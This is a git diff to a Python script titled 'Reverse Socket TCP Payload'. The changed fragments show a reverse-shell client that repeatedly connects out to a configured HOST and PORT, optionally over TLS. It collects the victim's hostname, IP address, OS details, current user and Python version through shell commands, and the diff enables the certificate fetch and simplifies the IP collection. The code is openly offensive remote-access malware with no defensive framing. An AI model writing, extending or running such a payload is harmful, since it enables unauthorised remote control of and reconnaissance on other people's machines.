@@ -1,5 +1,6 @@
 # Reverse Socket TCP Payload
 # Author: @screamz2k
+
 import os
 import platform
 import time
@@ -40,7 +41,8 @@ def encrypt(data):
 
 for i in range(1, TIMEOUT):
     try:
-        #cert = ssl.get_server_certificate((HOST, PORT), ssl_version=ssl.PROTOCOL_TLS_CLIENT)
+        if ssl:
+            cert = ssl.get_server_certificate((HOST, PORT), ssl_version=ssl.PROTOCOL_TLS_CLIENT)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((HOST, PORT))
     except socket.error as e:
@@ -91,12 +93,7 @@ for i in range(1, TIMEOUT):
             # Get System Infos
             infos = {}
             infos["hostname"] = sp.getoutput("hostname")
-            try:
-                infos["remote_ip"] = requests.get(
-                    "https://api.ipify.org").text
-            except Exception as e:
-                infos["remote_ip"] = e
-            infos["local_ip"] = socket.gethostbyname(socket.gethostname())
+            infos["ip"] = socket.gethostbyname(socket.gethostname())
             infos["operating_system"] = sp.getoutput("uname -a")
             infos["user"] = sp.getoutput("whoami")
             infos["python_version"] = sp.getoutput("python3 -V")
